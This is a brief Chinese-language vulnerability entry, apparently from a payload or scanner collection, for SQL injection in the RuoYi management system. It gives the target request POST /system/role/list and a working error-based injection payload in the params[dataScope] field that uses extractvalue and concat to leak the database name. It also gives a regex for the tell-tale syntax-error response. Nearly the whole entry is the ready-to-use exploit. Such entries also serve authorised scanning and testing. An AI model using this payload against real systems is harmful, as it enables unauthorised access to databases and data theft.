# 若依RuoYi系统sql注入1

若依 ｜ SQL注入 ｜ —
- **请求**：`POST /system/role/list HTTP/1.1`

**Payload**
```
pageSize=&pageNum=&orderByColumn=&isAsc=&roleName=&roleKey=&status=&params[beginTime]=&params[endTime]=&params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
```
- **响应特征**：200 ^(?=.*?syntax)(?=.*?error).*?$